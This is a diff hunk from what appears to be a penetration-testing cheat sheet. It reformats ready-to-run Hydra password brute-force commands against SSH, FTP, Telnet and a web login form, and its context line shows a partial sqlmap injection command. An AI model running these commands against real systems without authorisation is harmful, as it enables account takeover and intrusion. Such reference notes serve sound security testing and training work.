@@ -272,21 +272,21 @@ sqlmap -u "http:domain.com/path.aspx?id=1" cookie=”PHPSESSID=1tmgthfok042dslt7
 
 > Hydra : FTP, SSH, Telnet
   
-```shell
+```console
 # SSH
-~# hydra -l username -P passlist.txt 192.168.0.100 ssh
+hydra -l username -P passlist.txt 192.168.0.100 ssh
   
  # FTP
-~$ hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100
+hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100
  
 # If the service isn't running on the default port, use -s
-~$ hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
+ hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
   
 # TELNET
-~$ hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet
+hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet
 
 # Login form
-~$ sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
   
 ```
   
